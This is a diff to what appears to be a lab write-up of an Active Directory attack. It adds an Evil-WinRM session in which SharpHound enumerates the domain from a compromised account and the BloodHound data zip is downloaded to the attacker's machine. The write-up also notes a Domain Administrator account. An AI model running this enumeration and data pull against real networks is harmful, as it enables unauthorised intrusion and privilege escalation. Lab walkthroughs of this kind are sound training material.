@@ -183,6 +183,13 @@ To be brought to the sharphound directory at `/usr/share/sharphound`, and transf
 
 To run it, just do `.\SharpHound.exe` and it'll generate a zip file with the loot. After that, transfer it over locally via evil-winrm's download module and ingest into your local bloodhound instance!
 
+```zsh
+*Evil-WinRM* PS C:\Users\Athena_svc\Desktop> .\SharpHound.exe
+...
+2026-05-14T10:16:26.6063428-04:00|INFORMATION|SharpHound Enumeration Completed at 10:16 AM on 5/14/2026! Happy Graphing!
+*Evil-WinRM* PS C:\Users\Athena_svc\Desktop> download 20260514101625_BloodHound.zip .
+```
+
 After ingesting, there's a few things I noticed:
 1) `athena.t0` is a Domain Administrator on the environment
 ![Athena.t0 DA](./static/9-athenato-is-an-DA.jpeg "MartiniAD/FIG_09: Athena.t0 is DA")
